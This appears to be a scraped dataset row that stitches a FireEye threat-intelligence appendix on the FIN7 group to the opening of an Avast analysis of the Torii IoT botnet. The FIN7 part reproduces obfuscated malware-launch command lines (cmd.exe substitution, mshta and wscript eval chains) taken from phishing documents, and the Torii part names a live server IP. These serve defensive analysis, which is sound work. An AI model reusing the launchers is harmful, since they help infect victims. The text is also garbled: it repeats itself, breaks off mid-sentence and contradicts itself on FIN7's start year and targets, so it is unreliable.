FIN7, financially-motivated threat actors are becoming extremely advanced and are capable of inflicting significant harm on organizations through vast, but carefully orchestrated campaigns. As sophisticated threat groups continue to emerge, partnerships, such as those exhibited here, will almost certainly play a key role in combating these threats.AcknowledgementsJordan Nuce, Tom Bennett, Michael Bailey, and Daniel BohannonTechnical AppendixFireEye has responded to many FIN7 incidents, which has provided us extensive insight into their operations. As part of this blog post, we are also including numerous indicators that we attribute to FIN7 and an overview of their techniques to aid organizations in identifying malicious activity across their networks.Phishing Documents Technical DetailsIn addition to LNK metadata, FIN7 phishing documents consistently contained artifacts detailing the local file system paths of component files used to construct the spear phishing documents. In the following tables, we have also included examples of the myriad of command line obfuscation techniques used by FIN7. Of particular note is the quick turnaround time between documents employing different techniques.EXIF Creation Time Attribution Malware MD5 Filename 2018:05:21 17:32:00 Suspected FIN7 GRIFFON 7e703dddcfc83cd352a910b48eaca95e C:\Users\jimbo\Desktop\Files\????????\outlook2.png cmd.exe /k ""SET a01=wscr& SET a02=ipt&&call %a01%%a02% /e:jscript //b %TEMP%\errors.txt EXIF Creation Time Attribution Malware MD5 Filename 2018:01:26 15:59:00 Suspected FIN7 BATELEUR bb1a76702e2e7d0aa23385f24683d214 Doc1.doc C:\Users\Hass\Desktop\????????\New\outlook3.png cmd.exe /c wscript.exe //b /e:jscript %TEMP%\crashpad.ini EXIF Creation Time Attribution Malware MD5 Filename 2018:01:11 13:16:00 Suspected FIN7 BATELEUR 5972597b729a7d2853a3b37444e58e01 check.doc C:\Users\Hass\Desktop\????????\New\outlook2.png cmd.exe /c wscript.exe //b /e:jscript %TEMP%\crashpad.ini EXIF Creation Time Attribution Malware MD5 Filename 2017:10:25 07:43:00 Suspected FIN7 BATELEUR c4aabdcf19898d9c30c4c2edea0147f0 document1.doc C:\Users\oleg\Desktop\?????\????????\New\defender.jpg cmd.exe /c wscript.exe //b /e:jscript %TEMP%\crashpad.ini EXIF Creation Time Attribution Malware MD5 Filename 2017:06:23 15:18:00 Suspected FIN7 BATELEUR 467062d2a5a341716c42c6d7f36ba0ed check.doc C:\Users\Work\Desktop\IMAGES\outlook2.png wscript.exe //b /e:jscript %TEMP%\debug.txtTable 2: Suspected FIN7 spear phishing launch parameters and attacker local system artifactsEXIF Creation Time Attribution Malware MD5 Filename 2017:10:06 11:21:00 FIN7 HALFBAKED 29a3666cee0762fcd731fa663ebc0011 Doc0610.docx C:\Users\andy\Desktop\unlock.cmd cmd /c """"%TMP%\unlock.cmd"" "" @set w=wsc@ript /b /e:js@cript %HOMEPATH%\tt.txt@echo try{var fs=new ActiveXObject('Scripting.FileSystemObject'),sh=new ActiveXObject('Wscript.Shell'),p=sh.ExpandEnvironmentStrings('%%HOM'+'EPATH%%')+'\\pp.txt',var f=fs.OpenTextFile(p,1,false),for(i=0,i^<4,i++)f.SkipLine(),var com='',while(!f.AtEndOfStream)com+=f.ReadLine().substr(1),f.Close(),try{fs.DeleteFile(p, true),}catch(e){}this[String.fromCharCode(101)+'v'+'al'](com),}catch(e){}, >%HOMEPATH%\tt.txt@copy /y %TMP%\unlock.cmd %HOMEPATH%\pp.txt@echo %w:@=%|cmd EXIF Creation Time Attribution Malware MD5 Filename 2017:09:27 11:56:00 FIN7 HALFBAKED 6146a18570e134c6c32633aca14375fb Doc2709.docx C:\Users\usr\Documents\send\270917\unlock.doc.lnk wmic.exe process call create ""cmd start /min cmd /c for /f \""usebackq delims=\"" %x in (`FindStr /R /C:\""@[0-9]@\"" \""%TEMP%\unlock.doc.lnk\""`) do %x|cmd >nul 2>&1 &"" cmd.exe /S /D /c"" echo /*@8@*/try{sh=new ActiveXObject(""Wscript.Shell""),fs=new ActiveXObject(""Scripting.FileSystemObject""),p=sh.ExpandEnvironmentStrings(""%TM""+""P%""),f=fs.GetFile(p+""//unlock.doc.lnk""),s=f.OpenAsTextStream(1,0),c=s.Read(2403),c=s.ReadAll(),s.Close(),this[String.fromCharCode(101)+'va'+'l'](c),}catch(e){} >%HOMEPATH%\t.txt & wscript //b /e:jscript %HOMEPATH%\t.txt >nul 2>&1 &"" EXIF Creation Time Attribution Malware MD5 Filename 2017:08:08 17:38:00 FIN7 HALFBAKED 03e85ad4217775906e6b5ceae8dc27af Doc_n0908.rtf C:\Users\andy\Desktop\unlock.doc.lnk wmic.exe process call create ""mshta javascript:eval(\""try{eval('wall=GetObject(\\'\\''+String.fromCharCode(44)+'\\'Word.Application\\')'),eval(wall.ActiveDocument.Shapes(2).TextFrame.TextRange.Text),}catch(e){},close(),\"")"" mshta.exe ""try{jelo = 'try{w=GetObject("""",""Wor""+""d.Application""),this[String.fromCharCode(101)+\\'va\\'+\\'l\\'](w.ActiveDocument.Shapes(1).TextFrame.TextRange.Text),}catch(e){},',var fso = new ActiveXObject(""Scripting.FileSystemObject""),var sh = new ActiveXObject(""Wscript.Shell""),var p = sh.ExpandEnvironmentStrings(""%HOMEPATH%"") + ""\\\\jelo.txt"""" EXIF Creation Time Attribution Malware MD5 Filename 2017:07:27 15:51:00 FIN7 HALFBAKED 63e2eb258a85ed4e72f951cdbff2a58e Dooq.docx C:\Users\jinvr-3-1\Desktop\unlock.doc.lnk cmd.exe /C set x=wsc@ript /e:js@cript %HOMEPATH%\ttt.txt & echo try{w=GetObject("""",""Wor""+""d.Application""),this[String.fromCharCode(101)+'va'+'l'](w.ActiveDocument.Shapes(2).TextFrame.TextRange.Text),}catch(e){}, >%HOMEPATH%\ttt.txt & echo %x:@=%|cmd EXIF Creation Time Attribution Malware MD5 Filename 2017:06:28 16:21:00 FIN7 HALFBAKED 22ad7c05128ca7b48b0a2a4507803b16 Doc0507.rtf C:\Users\andy\Desktop\unprotect.rtf.lnk cmd.exe /C set x=wsc@ript /e:js@cript %HOMEPATH%\md5.txt & echo try{w=GetObject("""",""Wor""+""d.Application""),this[String.fromCharCode(101)+'va'+'l'](w.ActiveDocument.Shapes(1).TextFrame.TextRange.Text),}catch(e){}, >%HOMEPATH%\md5.txt & echo %x:@=%|cmd EXIF Creation Time Attribution Malware MD5 Filename 2017:05:11 12:59:00 FIN7 HALFBAKEDBEACON 99975b5ee2ddd31e89c9bdda7a3871d9 Doc1.docx C:\Users\user\Documents\unprotect.lnk C:\WINDOWS\system32\mshta.exe vbscript:Execute(""On Error Resume Next:set yjdsqjtrn=GetObject(,""""Word.Application""""):execute yjdsqjtrn.ActiveDocument.Shapes(2).TextFrame.TextRange.Text:close"") EXIF Creation Time Attribution Malware MD5 Filename 2017:04:20 16:27:00 FIN7 HALFBAKEDBEACON 42a2a2352f6b1f5818f3b695f240fc3a info.rtf C:\Users\testadmin.TEST\Desktop\unprotect.lnk C:\WINDOWS\system32\mshta.exe vbscript:Execute(""On Error Resume Next:set wprotect=GetObject(,""""Word.Application""""):execute wprotect.ActiveDocument.Shapes(1).TextFrame.TextRange.Text:close"") EXIF Creation Time Attribution Malware MD5 Filename 2017:01:12 18:00:00 FIN7 HALFBAKEDBEACONBELLHOP cea2989309ccd5128f437335622978f1 order.rtf C:\Users\testadmin.TEST\Desktop\unprotected.vbeC:\Users\tst01\Desktop\unprotected.vbs %WINDIR%\System32\Wscript.exe %TEMP%\WindowsUpdate_X24532\beginer.vbs EXIF Creation Time Attribution Malware MD5 Filename 2016:08:12 11:26:00 FIN7 HALFBAKED fbf653b89a0814f515ddbdcf82cc3795 Reservation - Copy.docx C:\Users\test\Documents\sploits\120816\order.vbe %WINDIR%\System32\Wscript.exe %TEMP%\AdobeUpdateManagementTool.vbsTable 3: FIN7 spear phishing launch parameters and attacker local system artifactsFIN7 Tactics, Techniques & Procedures (TTPs)FireEye is providing insight into FIN7's notable methodologies across multiple stages of the attack lifecycle and tips for identifying evidence of this activity and similarly suspicious activity in your environment.Attack Lifecycle Stage Adversary Methodology Discovery Tips Initial Compromise Spear phishing emails sent using PHP Mailer Inbound emails containing metadata such as ""X-Mailer: PHPMailer"" Establish Foothold Persistence using registry Run and Run Once keys New Run and RunOnce registry entries referencing .VBS and .VBA Establish Foothold Execution or persistence using Scheduled Tasks New Scheduled Tasks referencing .CMD, .LNK, .VBS, .VBA, .PS1 and other scripting language extensions Establish Foothold Persistence using Windows Services, Startup Directory New Windows Services, new files in Startup directories Establish Foothold Persistence using AppCompat Shim New shim database files and modifications of AppCompatFlags registry keys (see FIN7 SDB Persistence) Maintain Presence C2 using favored C2 ports Outbound connections with port-protocol mismatches on common ports such as 53,80,443,8080 Maintain Presence C2 using favored generic 3LDs Outbound connections or DNS resolutions to ""sketchy"" 2nd level domains with generic 3rd level domains such as mail, www1, www2, dns, ftp (eg. ""mail[.]qefg[.]info"") Maintain Presence C2 using VPS infrastructure with low reputation Inbound and outbound connections from and to non-standard IP ranges, especially from international Virtual Private Server (VPS) providers Maintain Presence C2 using legitimate services including Google Docs, Google Scripts and Pastebin Maintain Presence C2 using DNS via A, OPT, TXT records Unusually long or numerous DNS A, TXT and OPT record queries Maintain Presence C2 domains registered with REG.RU Newly observed domains registered via REG.RU Maintain Presence C2 domains registered with NameCheap Newly observed domains registered via NameCheap Maintain Presence C2 domains registered with odd format and top-level domains Unusually long or numerous DNS queries with the structure [a-zA-Z]{4,5}\.[pw|us|club|info|site|top] (eg. ""pvze[.]club"") Maintain Presence C2 domains registered with hyphen Outbound connections to newly registered, hyphenated domainsTable 4: FIN7 TTPsFIN7 IndicatorsFireEye is providing these granular technical indicators so that interested parties can better understand the threat actor and search for their historical activity across enterprise networks.Phishing Documents DroppersFilename MD5 Attribution Malware menu.rtf c14eb54769ff208a2562e4ef47958d9e FIN7 76eb6f124fba6599a54e92b829c55b63 FIN7 BEACON 3-ThompsonDan.rtf 4b783bd0bd7fcf880ca75359d9fc4da6 FIN7 BEACONBELLHOPHALFBAKED claim.rtf af53db730732aa7db5fdd45ebba34b94 FIN7 BEACONBELLHOPHALFBAKED order.rtf cea2989309ccd5128f437335622978f1 FIN7 BEACONBELLHOPHALFBAKED order.rtf cf4ccb3707e5597969738b4754782e4d FIN7 BEACONBELLHOPHALFBAKED Doc2_rtf.rtf 2dc0f4bece10759307026d90f585e006 FIN7 BEACONHALFBAKED doc1.doc 37759603c6cd91ebc8a1ea9ac0f2d580 FIN7 BEACONHALFBAKED quote.rtf 3c0bd71e91e0f18621ba43de4419f901 FIN7 BEACONHALFBAKED Doc2_rtf.rtf 562a64f1c09306d385962cf8084b6827 FIN7 BEACONHALFBAKED information.doc 5dace5ac5ba89c9bba4479264f75b2b6 FIN7 BEACONHALFBAKED Doc_rest_rtf.rtf 619aa4e6c9db275381ab0e7fc7078f5f FIN7 BEACONHALFBAKED doc1.docx 67c9bfd4d6ac397fb0cd7da2441a6fe2 FIN7 BEACONHALFBAKED Doc33.docx 6a5a42ed234910121dbb7d1994ab5a5e FIN7 BEACONHALFBAKED info_.rtf 6ac5ae6546746e3a9502cc489b71146e FIN7 BEACONHALFBAKED bmg.docx 754fc509328af413d93131e65fc46d31 FIN7 BEACONHALFBAKED Doc_0405_1.rtf 7b2315ff1f2d763857aa70ad34b75449 FIN7 BEACONHALFBAKED doc1.docx 99975b5ee2ddd31e89c9bdda7a3871d9 FIN7 BEACONHALFBAKED doc0505_1.rtf 9eb71edd5ec99294a1c341efa780b1b1 FIN7 BEACONHALFBAKED DonovanR.docx b5829caad7c448c558cb1dab2d9f4320 FIN7 BEACONHALFBAKED rising star.rtf c8b8420d1503ae48ff35362f5d29eeb3 FIN7 BEACONHALFBAKED inf6.docx e494356fc0db7ef6009d29e5ae869717 FIN7 BEACONHALFBAKED Claim.docx 06b9e2fdd2c0eeb78b851c93ca66f25f FIN7 BELLHOP order.rtf 80eed9f87a18b0093eb3f16fa495b6f7 FIN7 BELLHOP Details Joseph.docx b4d48f3e1ae339f2fcb94b7abceecfff FIN7 BELLHOP order.doc e2a6b351c276d02d71e18cd0677e8236 FIN7 BELLHOPHALFBAKED b14bc8cbc7f2d36179ebff96ade6d867 FIN7 CARBANAK features.doc bbd99ef280efebe9066c0aef91bf02cd FIN7 DRIFTPINHALFBAKED doc2709.rtf 01d666fcbc4cdcedbfe7963f498e7858 FIN7 HALFBAKED doc_n0908.rtf 03e85ad4217775906e6b5ceae8dc27af FIN7 HALFBAKED doc1.docx 0d6619481cfd29791a51ebb42ace5c03 FIN7 HALFBAKED doc1.rtf 0e0a51489054529a9dcb177d39f08b81 FIN7 HALFBAKED doc0719.docx 101bdbbd99cfd74aa5724842404642f2 FIN7 HALFBAKED doc0507.docx 17fabe288d640476a70154c59d5a1ba1 FIN7 HALFBAKED info_1.rtf 189c5a090d2b3b87ab65a8b156cd971e FIN7 HALFBAKED doc.docx 1a6c18967f4ce1c91c77098af4957e6e FIN7 HALFBAKED Mail.rtf 1a9e113b2f3caa7a141a94c8bc187ea7 FIN7 HALFBAKED Doc_rest_n_rtf.rtf 1f5022a02c82fbe414dc91bf3f1b5180 FIN7 HALFBAKED doc.docx 1f98c4ff12fc2c6fbf8247a5b2e4e7f4 FIN7 HALFBAKED doc1909.docx 1fbe77a3b5771ce4f95e02a49c5b7f30 FIN7 HALFBAKED doc_n0808.rtf 21926646a658bdf39cf28cdfbb1aced7 FIN7 HALFBAKED doc0507.rtf 22ad7c05128ca7b48b0a2a4507803b16 FIN7 HALFBAKED Doc2.docx 22e7d4f7401ef34b3b6d17c15291c497 FIN7 HALFBAKED menu.rtf 24fab1e9831e57307d17981abaabf960 FIN7 HALFBAKED 2-order.docx 28ad8e3a225400a1d00f6023f8e6c9c8 FIN7 HALFBAKED doc0610.docx 29a3666cee0762fcd731fa663ebc0011 FIN7 HALFBAKED doc2209_1.rtf 2d36634974c85eff393698b39edc561c FIN7 HALFBAKED Doc1.rtf 307a9ce257e97189e046fa91d3c27dab FIN7 HALFBAKED doc1.rtf 325844f1b956c52fc220932bc717f224 FIN7 HALFBAKED doc0910.rtf 3917028799d2aa3a43ec5bad067e99a5 FIN7 HALFBAKED doc1.docx 397d45b6001919b04739e26379c84dd9 FIN7 HALFBAKED docr.rtf 3a303f02e16d7d27fa78c3f48a55d992 FIN7 HALFBAKED oliver_davis.docx 3b12f36a01326ec649e4def08b860339 FIN7 HALFBAKED doc2209.docx.docx 402c34d7d6ce92bf5a048023bd2fde4a FIN7 HALFBAKED Dooq.docx 41c6861313e731bd3f84dd70360573ce FIN7 HALFBAKED info.rtf 42a2a2352f6b1f5818f3b695f240fc3a FIN7 HALFBAKED james.docx 499ebef3ab31a2f98fc8a358bd085b0f FIN7 HALFBAKED doc1007.rtf 4b7a742d5c98fc62f0f67445032e7bc6 FIN7 HALFBAKED tem6.doc 4bf691809224d17e49cebb071d22a867 FIN7 HALFBAKED doc1.rtf 511af2b4c62fa4c2bb91f3be1ca96094 FIN7 HALFBAKED doc1.docx 52cf6a63da29331d805a5a9b5015580f FIN7 HALFBAKED doc2209.rtf 560e72858ee413d7a6f72fff5ab7577b FIN7 HALFBAKED doc1.docx 5a0b796c7a6040e02c822cac4475f11a FIN7 HALFBAKED doc0717.rtf 5d49b444734b003b6917b81f0a779b3e FIN7 HALFBAKED 5d9525b48870dc438130bd96fb8c5b66 FIN7 HALFBAKED doc2.doc 5dd2e677fd1d65f051b7f54e7402721f FIN7 HALFBAKED Dooq.docx 63e2eb258a85ed4e72f951cdbff2a58e FIN7 HALFBAKED doc0720.rtf 6a860285a6f7521995151a2a0cb6e316 FIN7 HALFBAKED doc0719.rtf 6adec78e874232722c3758bbbcb95829 FIN7 HALFBAKED virus.docx 70f0f8db551dd6b084682188c3923e26 FIN7 HALFBAKED check.rtf 72d973ebfbc00d26170bfafdfbbd0179 FIN7 HALFBAKED Doc_0405.rtf 74165408ff12d195fb9d68afe0a6011e FIN7 HALFBAKED oliver_davis.rtf 793511c86a0469d579ff8cc99a7311e3 FIN7 HALFBAKED doc_n0808.docx 79628a598303692238cc4aeb19da6fed FIN7 HALFBAKED Doc1.rtf 7d664485c53b98180e6f3c69e9dfa81e FIN7 HALFBAKED doc1.docx 82a32d98e68891625b6de67a9d0b61c6 FIN7 HALFBAKED document.doc 853a53419d9dbc606d2392b99e60c173 FIN7 HALFBAKED doc2806.rtf 856cec68ddd28367c0d0f0a6f566187a FIN7 HALFBAKED doc1.rtf 8608b31a446f42a7f36807bd6c16d2c0 FIN7 HALFBAKED Doc1.rtf 8bd798e89d075827cc757b9586f15ce2 FIN7 HALFBAKED doc1.rtf 94771bcf572d5c0b834f73d577f06cc8 FIN7 HALFBAKED doc1610.rtf 973377e27b5dffa289f84e62a6833ebc FIN7 HALFBAKED Doc0725.rtf 9788b3faa29ba9eb4cae46f3c249937e FIN7 HALFBAKED Doc1.rtf 9b87f9f6498c241f50208f9906907195 FIN7 HALFBAKED doc1.rtf a5f75333d0c81387a5a9c7696b967a20 FIN7 HALFBAKED doc0610.rtf a8e312d0c230e226e97e7a441fadbd85 FIN7 HALFBAKED doc2_r_new.rtf a9c50b7761519fb684cdee2d59f99f91 FIN7 HALFBAKED credit details.rtf aaf42acedc38565f4c33cfdbb09733b9 FIN7 HALFBAKED doc2.docx_ b5cc86726ab8f1fb3c281ab8f935260f FIN7 HALFBAKED b6f005236a37367a147f9060c708ccca FIN7 HALFBAKED doc1.rtf c0d122bcdcb6ede7fc7f1182e4d0e599 FIN7 HALFBAKED doc2806.docx c3f48e69bb90be828ba2835b76fb2080 FIN7 HALFBAKED doc1.rtf c5e94d973ed4f963ddc09ab88def3b5f FIN7 HALFBAKED doc1.rtf c6cddc475d62503a17a34419918e7fc0 FIN7 HALFBAKED doc0714.docx caec3babdec3cf267cc846fd084c4626 FIN7 HALFBAKED doc1909.rtf d1f55491472ca747561509106b71eab8 FIN7 HALFBAKED doc_n0908.docx d38fb2d95812ffa1014e52ef3079e5da FIN7 HALFBAKED catering_.rtf d5cd1dedf3bf5c943e348a8b84e37b2a FIN7 HALFBAKED doc0714.rtf dde72a54716deb88c1ffef2a63faab6b FIN7 HALFBAKED m1.doc e0ca85c0d264b84d977df0c48fd383cc FIN7 HALFBAKED doc1.rtf e17fe2978ebe1b0a6923acd2ffeda3c2 FIN7 HALFBAKED doc2009.rtf e184219366afb2e6bd0b9502beab1156 FIN7 HALFBAKED doc1610.docx e9154e2f80389b853ab4cf2fe98f1ed2 FIN7 HALFBAKED doc1.rtf edc4f02f265a4aaa552435f293409f01 FIN7 HALFBAKED doc2_r_new.rtf ee5a600ef9fd1defe07ea097095d1beb FIN7 HALFBAKED doc1.rtf effdaf7f61acb277ac44ee4d9bc8900a FIN7 HALFBAKED info_.docx f2ac2ec8173db4963dc2089ac90b8807 FIN7 HALFBAKED Doc0725.docx f80a80d25b3393825baa1e84e76ddf6c FIN7 HALFBAKED 1.rtf fa1c548a5d691ac9ce7bfd929f204261 FIN7 HALFBAKED fa93c93a02fe2dee8a3b3d1cd82f293f FIN7 HALFBAKED poisoning.rtf faed087e820cad3c023be1db8d4ba70a FIN7 HALFBAKED order.docx fc661e18137583dc140e201338582a99 FIN7 HALFBAKED SEC_Security_Policy_2017_02.doc 032fe02e54a010d21fd71e97596f4101 FIN7 POWERSOURCE SEC_Security_Policy_2017_10.doc 14334c8f93f049659212773ecee477a2 FIN7 POWERSOURCE VargheseJ.doc 2abad0ae32dd72bac5da0af1e580a2eb FIN7 POWERSOURCE SEC_Security_Policy_2017_03.doc 37d323ffc33a0e1c6cd20234589a965d FIN7 POWERSOURCE 2017.doc 5a88e3825c5e89b07fa9050b6b6eca7c FIN7 POWERSOURCE SEC_Security_Policy_2017.doc 6ff3272cd9edf115230bad6a55cb3ca8 FIN7 POWERSOURCE EDGAR_FILLINGS_RULES_2016.doc 7bd2235f105dee20825b4395a04892bf FIN7 POWERSOURCE SEC_Security_Policy_2017_05.doc 8fa8d4c30429c099dc7e565e57db55c0 FIN7 POWERSOURCE SEC_Security_Policy_2017_06.doc ccd2372bb6b07f1b5a125e597005688d FIN7 POWERSOURCE Important_Changes_to_Form10_K.doc d04b6410dddee19adec75f597c52e386 FIN7 POWERSOURCE SEC_Security_Policy_2017.doc f20328b49ec605fd425ed101ff31f14b FIN7 POWERSOURCE SEC_Security_Policy_2017_07.doc f74958adcfb11abcb37e043013f6a90f FIN7 POWERSOURCE Filings_and_Forms.docx 47111e9854db533c328ddbe6e962602a FIN7 POWERSOURCE (Downloader) doc.doc 189c72bfd8ae31abcff5e7da691a7d30 Suspected FIN7 BATELEUR protected_instructions.d";"FIN7 is one of the most prolific financial threat groups of this decade, having carefully crafted attacks targeted at more than 100 organizations. The threat group is characterized by their persistent targeting and largescale theft of payment card data from victim systems, which it has monetized at least a portion of through a prominent card shop. But FIN7's financial operations were not limited to card data theft. In some instances, when they encountered and could not obtain payment card data from point of sale (POS) systems secured with endtoend encryption (E2EE) or pointtopoint encryption (P2PE), FIN7 pivoted to target finance departments within their victim organizations. Furthermore, in April 2017, FireEye reported that FIN7 sent spear phishing emails to personnel involved with United States Securities and Exchange Commission (SEC) filings at multiple organizations, providing further insight into FIN7's targeting. These targeted individuals would likely have access to material nonpublic information that FIN7 actors could use to gain a competitive advantage in stock trading. Diversification of their monetization tactics has allowed the group to impact a wide range of industries beyond those solely associated with payment card industry. During campaigns that FireEye associates with FIN7, victims within the following sectors have been targeted within the United States and Europe: Restaurants *TravelHospitality *EducationCasinos and Gaming *ConstructionEnergy *RetailFinance *TelecommunicationsHightech *GovernmentSoftware *Business services. Throughout FireEye's tracking of FIN7 campaigns, the attackers have attempted to stay ahead of the game and thwart detection, using novel tactics and displaying characteristics of a FireEye's analysis of FIN7's campaigns has revealed the group's use of novel tactics and displaying characteristics of a wellresourced operation. For example, in April 2017, FireEye blogged about FIN7's spear phishing emails that leveraged hidden shortcut files (LNK files) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim. This was a direct departure from their established use of weaponized Office macros and highlighted the group's adaptive nature to evade detection. FireEye also previously reported on FIN7's use of the CARBANAK backdoor as a postexploitation tool to cement their foothold in a network and maintain access to victim environments. CARBANAK is well known for its use in highly profitable and sophisticated attacks dating back to 2013, with usage attributable to FIN7 beginning in late 2015, although how interconnected the campaigns employing the malware over this fiveyear span is unclear. FIN7's use of CARBANAK is particularly notable due to their use of creative persistence mechanisms to launch the backdoor. The group leveraged an application shim database that injected a malicious inmemory patch into the Services Control Manager (""services.exe"") process, and then spawned a CARBANAK backdoor process. FIN7 also used this tactic to install a payment card harvesting utility. Another notable characteristic of FIN7 has been their heavy use of digital certificates. Unsurprisingly, malicious threat actors have sought to exploit the legitimacy afforded by these certificates. By digitally signing their phishing documents, backdoors and later stage FIN7 is a sophisticated cybercrime group that has been active since at least 2013. The group is known for its use of phishing emails, malware, and other malicious tactics to steal data and money from its victims. FIN7 has been observed creating novel obfuscation methods, and in some cases modifying the methods on a daily basis while launching attacks targeting multiple victims. The threat group regularly tested malicious DOC, DOCX, and RTF phishing documents against public repositories to check static detection engine coverage. Their development of a payload obfuscation style using the Windows command interpreter's (cmd.exe) native string substitution was so unique that FireEye dubbed it ""FINcoding."" These methods inspired deep command line obfuscation research and the release of Daniel Bohannon's InvokeDOSfuscation. Reference Table 2 and Table 3 for a selection of samples and their associated command line obfuscation techniques. FIN7's Relentless Phone Calls and Bellyaching Over the three years of responding to a multitude of compromises and proactively defending against FIN7, FireEye observed unprecedented social engineering prowess. From leveraging web forms for initial contact to targeting and engaging directly with predetermined store managers, the operators demonstrated a range of capabilities. FIN7's reach extended beyond their targets' computer systems. FireEye has responded to incidents where FIN7 has called victims prior to lodging digital complaints laden with malicious documents as well as after the phishing documents have been sent, in order to check if they were received a crude but effective FIN7 email delivery tracking technique. As FIN7 has matured, so did the quality of their phishing FireEye has tracked several FIN7 personas throughout their operations by collecting and parsing filetypes of forensic value for juicy metadata. In a previous blog, we shared how LNK files created by FIN7 unintentionally revealed valuable information about their development environment. LNK files can contain metadata that reveals attributes about the systems on which the LNKs were created, including original file paths, volume serial numbers, MAC addresses, and hostnames. By studying values within the LNK metadata we often identify ""toolmarks,"" or unique values associated with distinct malware developer and operator personas. FIN7 LNK metadata shows that the actors routinely used virtual machines with generic hostnames such as ANDYPC or USERPC, and default hostnames with the structure WIN[AZ09]{11} (e.g. WINABCDEFGH1JK). FireEye has tracked several hostname and path toolmarks associated with FIN7's operations, which we have used to link clusters of threat activity together. FireEye has identified multiple domains registered using patterns consistent with prior FIN7 activity, as well as campaigns using disparate TTPs that we have attributed to FIN7 with varying degrees of confidence. ZIP archives delivering the BIRDDOG backdoor were hosted on a portion of suspected FIN7 domains registered in 2018. FIN7 is a cybercrime group that has been active since at least 2017. The group has been known to target financial institutions, restaurants, and other businesses in Eastern Europe and Central Asia. The group has used a variety of tactics, including phishing emails, malicious documents, and macroembedded Word documents. The group has also been known to use front companies, such as Combi Security, to mask their activities. FireEye iSIGHT Intelligence has observed that the criminal organization behind FIN7 is almost certainly comprised of many additional individuals beyond those already apprehended by law enforcement authorities. FireEye iSIGHT Intelligence expects that at least a portion of these malicious actors are likely to continue conducting cyber crime activity in some capacity. Although we expect activity to continue, it is extremely common for threat actors to either modify their TTPs or temporarily halt operations following significant developments such as arrests of highlevel members and/or public disclosure of TTPs that they employ. Depending on the organizational and communication structure of the group, it is also plausible that multiple subgroups could form and carry out independent operations in the future. Recent campaigns, as well as those using tactics that were atypical for historical FIN7 campaigns, such as the SEC campaigns with widespread targeting, may be representative of semiautonomous groups preexisting within, or cooperating with, the FIN7 criminal organization. As noted in our CARBANAK overview, certain malware families and techniques transcend strictly defined threat groups, and may be reused by developers and operators as they transition between organizations and campaigns. FireEye has responded to many FIN7 incidents, which has provided us extensive insight into their operations. As part of this blog post, we are also including numerous indicators that we attribute to FIN7 and an overview of their techniques to aid organizations in identifying malicious activity across their networks.";en;{'r': 0.3504326328800989, 'p': 0.9356435643564357, 'f': 0.509892082366224};{'r': 0.30630914826498423, 'p': 0.8779385171790235, 'f': 0.4541627651079054};{'r': 0.3504326328800989, 'p': 0.9356435643564357, 'f': 0.509892082366224}
https://blog.avast.com/new-torii-botnet-threat-research;Torii botnet - Not another Mirai variant;"New, more sophisticated IoT botnet targets a wide range of deviceswritten by Jakub Kroustek, Vladislav Iliushin, Anna Shirokova, Jan Neduchal and Martin HronDisclaimer: Analysis of the server content and samples was done on Thursday, September 20th. Follow the Avast Blog for further updates.Introduction2018 has been a year where the Mirai and QBot variants just keep coming. Any script kiddie now can use the Mirai source code, make a few changes, give it a new Japanese-sounding name, and then release it as a new botnet.Over the past week, we have been observing a new malware strain, which we call Torii, that differs from Mirai and other botnets we know of, particularly in the advanced techniques it uses.Unlike the aforementioned IoT botnets, this one tries to be more stealthy and persistent once the device is compromised, and it does not (yet) do the usual stuff a botnet does like DDOS, attacking all the devices connected to the internet, or, of course, mining cryptocurrencies.Instead, it comes with a quite rich set of features for exfiltration of (sensitive) information, modular architecture capable of fetching and executing other commands and executables and all of it via multiple layers of encrypted communication.Furthermore, Torii can infect a wide range of devices and it provides support for a wide range of target architectures, including MIPS, ARM, x86, x64, PowerPC, SuperH, and others. Definitely, one of the largest sets we've seen so far.As we've been digging into this strain, we've found indications that this operation has been running since December 2017, maybe even longer.We would like to give credit to @VessOnSecurity, who actually tweeted about a sample of this strain hitting his telnet honeypot last week.According to this security researcher, telnet attacks have been coming to his honeypot from Tor exit nodes, so we decided to name this botnet strain ""Torii"".In this post, we will describe what we know about this strain so far, how it is spreading, what are its stages, and we will depict some of its features.The analysis is still ongoing and further findings will be included in blog post updates.Now, let's start with the infection vector.Analysis of the initial shell scriptThe infection chain starts with a telnet attack on the weak credentials of targeted devices followed by execution of an initial shell script. This script looks quite different from typical scripts that IoT malware uses in that it is far more sophisticated.The script initially tries to discover the architecture of the targeted device and then attempts to download the appropriate payload for that device.The list of architectures that Torii supports is quite impressive: including devices based on x86_64, x86, ARM, MIPS, Motorola 68k, SuperH, PPC - with various bit-width and endianness. This allows Torii to infect a wide range of devices running on these very common architectures.The malware uses several commands to download binary payloads by executing the following commands: ""wget"", ""ftpget"", ""ftp"", ""busybox wget"", or ""busybox ftpget"". It uses multiple commands to maximize the likelihood that it can deliver the payload.If the binaries cannot be downloaded via the HTTP protocol with ""wget"" or ""busybox wget"" commands, it will use FTP. When the FTP protocol is being used, it requires authentication. Credentials are nicely provided in the script:Username: u=""<redacted>""Password: p=""<redacted>""Port for FTP: po=404IP of the FTP/HTTP server: 104.237.218.85 (This IP is still alive at the time of writing this post.)By connecting to the FTP server, there is quite a lot going on:Click to view full fileAmong other things, the server contains logs from the NGINX and FTP servers, payload samples, a bash script that directs the infected devices to this very machine where the malware is hosted, and more. We'll discuss what we found in these logs at the end of this post, but first let's take a look at all the samples that are hosted there.Analysis of the 1st stage payload (dropper)Once the script determines which architecture the target device it is running on, it downloads and executes the appropriate binary from the server. All of these binary files are in the ELF file format. While analyzing these payloads, we found that they are all very similar and are ""just"" droppers of the second stage payload. What is notable is that they use several methods to make the second stage persistent on the target device. Let's look deeper into the details below.For our description, we'll focus on the x86 sample with the SHA256 hash:0ff70de135cee727eca5780621ba05a6ce215ad4c759b3a096dd5ece1ac3d378.String ObfuscationFirst we tried to de-obfuscate the sample, so we delved into some of the text strings to look for clues on how the malware works. The vast majority of text strings in the 1st and 2nd stage are encrypted by a simple XOR-based encryption and they are decrypted during runtime when a particular string is needed. You can use the following IDA Python script for decryption:sea = ScreenEA()max_size = 0xFFfor i in range(0x00, max_size):b = Byte(sea+i)decoded_byte = (b ^ (0xFEBCEADE >> 8 * (i % 4))) & 0xFF,PatchByte(sea+i,decoded_byte)if b == 0x00 or decoded_byte == 0x00:breake.g. F1 9A CE 91 BD C5 CF 9B B2 8C 93 9B A6 8F BC 00 ? '/proc/self/exe'Install 2nd Stage ELF FileThe core functionality of the first stage is to install another ELF file, the second stage executable, which is contained within the first ELF file.The file is installed into a pseudo-random location that is generated by combining a predefined location from a 